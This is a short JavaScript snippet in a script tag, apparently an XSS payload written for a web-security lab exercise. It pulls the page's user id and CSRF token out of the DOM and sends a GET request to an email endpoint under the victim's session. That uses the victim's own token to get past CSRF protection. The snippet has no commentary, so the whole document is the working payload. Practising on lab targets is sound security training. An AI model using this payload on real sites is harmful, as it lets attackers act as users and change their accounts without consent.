<script>
var name = 'john';
var uid = document.getElementById('uid').innerHTML.slice(4,7);
var csrf = document.getElementById('csrf').innerHTML.slice(6,55);
xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
	if(this.readyState == 4 && this.status == 200){
		document.getElementById('result').innerHTML = this.responseText;
	}
};
xhttp.open('get','/lab/webapp/jfp/17/email?name='+name+'&'+'uid='+uid+'&'+'csrf_token='+csrf,true);
xhttp.send();
</script>
